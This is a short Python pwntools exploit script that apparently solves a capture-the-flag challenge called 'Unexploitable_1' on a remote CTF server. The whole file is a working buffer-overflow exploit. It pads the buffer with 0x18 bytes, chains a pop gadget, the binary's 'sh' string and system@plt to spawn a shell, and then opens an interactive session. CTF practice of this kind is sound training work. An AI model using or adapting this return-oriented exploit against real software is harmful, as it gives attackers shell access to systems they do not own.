from pwn import *

p = remote('ctf.j0n9hyun.xyz', 3023)
#p = process('./Unexploitable_1')
e = ELF('./Unexploitable_1')

context.log_level="debug"
sh = next(e.search('sh\x00'))
p_r = 0x00000000004007d3

p.recv()

pause()

payload = 'a' * 0x18

payload += p64(p_r)
payload += p64(sh)
payload += p64(e.plt['system'])

log.info('sh : ' + hex(sh))

p.sendline(payload)

p.interactive()
